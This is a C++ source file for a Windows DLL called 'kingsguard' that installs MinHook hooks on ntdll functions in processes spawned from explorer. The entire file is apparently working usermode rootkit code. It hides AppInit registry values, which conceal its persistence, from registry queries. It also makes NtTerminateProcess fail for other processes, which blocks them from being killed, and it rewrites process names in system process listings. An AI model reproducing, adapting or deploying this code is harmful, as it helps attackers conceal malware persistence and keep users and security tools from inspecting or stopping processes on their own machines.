#include "kingsguard.h"

DWORD getParentPID(DWORD pid)
{
    HANDLE h = NULL;
    PROCESSENTRY32 pe = {0};
    DWORD ppid = 0;
    pe.dwSize = sizeof(PROCESSENTRY32);
    h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(h, &pe))
    {
        do
        {
            if (pe.th32ProcessID == pid)
            {
                ppid = pe.th32ParentProcessID;
                break;
            }
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    return (ppid);
}

int getProcessName(DWORD pid, char *fname, DWORD sz)
{
    HANDLE h = NULL;
    int e = 0;
    h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (h)
    {
        GetProcessImageFileName(h, fname, sz);
        CloseHandle(h);
    }
    else
    {
        e = GetLastError();
    }
    return (e);
}

bool ExplorerChild()
{
    DWORD pid, ppid;
    int e;
    char fname[MAX_PATH] = {0};
    pid = GetCurrentProcessId();
    std::string name;
    bool ret = true;
    do
    {
        if (pid == 0)
        {
            ret = false;
            break;
        }
        ppid = getParentPID(pid);
        e = getProcessName(ppid, fname, MAX_PATH);
        name = std::string(fname);
        pid = ppid;
    } while (name.find("explorer") == std::string::npos);

    return ret;
}

PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass)
{
    switch (keyValueInformationClass)
    {
    case KeyValueBasicInformation:
        return ((PNT_KEY_VALUE_BASIC_INFORMATION)keyValueInformation)->Name;
    case KeyValueFullInformation:
        return ((PNT_KEY_VALUE_FULL_INFORMATION)keyValueInformation)->Name;
    default:
        return NULL;
    }
}

// NTSTATUS WINAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength)
// {
//     NTSTATUS status = OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
//     OutputDebugStringA("called orig enum");

//     // Implement hiding of registry keys by correcting the index in NtEnumerateKey.
//     if (status == ERROR_SUCCESS && (keyInformationClass == KeyBasicInformation || keyInformationClass == KeyNameInformation))
//     {
//         OutputDebugStringW(L"in if");
//         for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
//         {
//             OutputDebugStringW(L"in for");
//             OutputDebugStringA(std::to_string(index).c_str());
//             OutputDebugStringA(std::to_string(newIndex).c_str());
//             OutputDebugStringA(std::to_string(i).c_str());
//             status = OriginalNtEnumerateKey(key, i, keyInformationClass, keyInformation, keyInformationLength, resultLength);

//             std::wstring name = std::wstring(KeyInformationGetName(keyInformation, keyInformationClass));
//             OutputDebugStringW(name.c_str());
//             if (name.find(L"AppInit") == std::wstring::npos)
//             {
//             	newIndex++;
//             }
//         }
//     }

//     return status;
// }

NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
{
    if (ValueName->Length > 3)
    {
        std::wstring w_name = std::wstring(ValueName->Buffer);
        if (w_name.find(L"Appinit") != std::wstring::npos || w_name.find(L"AppInit") != std::wstring::npos)
            return STATUS_OBJECT_NAME_NOT_FOUND;
    }
    return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
}

NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
{
    NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

    if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
    {
        for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
        {
            status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

            std::wstring name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
            if (name.find(L"AppInit") == std::wstring::npos)
            {
                newIndex++;
            }
        }
    }

    return status;
}

NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
{
    OutputDebugStringA("in ntterminate");
    if (GetProcessId(GetCurrentProcess()) == GetProcessId(hProcess))
        return OriginalNtTerminateProcess(hProcess, code);

    return 1;
}

// NTSTATUS WINAPI HookedNtOpenProcess(
//     PHANDLE ProcessHandle,
//     ACCESS_MASK DesiredAccess,
//     POBJECT_ATTRIBUTES ObjectAttributes,
//     PCLIENT_ID ClientId)
// {
//     NTSTATUS status = OriginalNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
//     // return STATUS_ACCESS_DENIED;

//     return status;
// }

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        PMY_SYSTEM_PROCESS_INFORMATION prev = PMY_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        PMY_SYSTEM_PROCESS_INFORMATION curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

        while (prev->NextEntryOffset != NULL)
        {
            WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, L"kingsguard", curr->ImageName.Length, NULL);
            prev = curr;
            curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }

    return status;
}

bool InstallHook()
{
    OutputDebugStringA("installing hook");
    if (MH_Initialize() != MH_OK)
    {
        return false;
    }

    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID *>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID *>(&OriginalNtQuerySystemInformation)) != MH_OK)
    {
        return false;
    }
    if (MH_CreateHookApi(L"ntdll", "NtTerminateProcess", reinterpret_cast<LPVOID *>(&HookedNtTerminateProcess), reinterpret_cast<LPVOID *>(&OriginalNtTerminateProcess)) != MH_OK)
    {
        return false;
    }
    // if (MH_CreateHookApi(L"ntdll", "NtOpenProcess", reinterpret_cast<LPVOID *>(&HookedNtOpenProcess), reinterpret_cast<LPVOID *>(&OriginalNtOpenProcess)) != MH_OK)
    // {
    //     return false;
    // }
    if (MH_CreateHookApi(L"ntdll", "NtEnumerateValueKey", reinterpret_cast<LPVOID *>(&HookedNtEnumerateValueKey), reinterpret_cast<LPVOID *>(&OriginalNtEnumerateValueKey)) != MH_OK)
    {
        return false;
    }
    if (MH_CreateHookApi(L"ntdll", "NtQueryValueKey", reinterpret_cast<LPVOID *>(&HookedNtQueryValueKey), reinterpret_cast<LPVOID *>(&OriginalNtQueryValueKey)) != MH_OK)
    {
        return false;
    }
    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
    {
        return false;
    }
    return true;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (!ExplorerChild() || !InstallHook())
            return FALSE;
        OutputDebugStringA("hooks installed.");
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        MH_DisableHook(MH_ALL_HOOKS);
        break;
    }
    return TRUE;
}
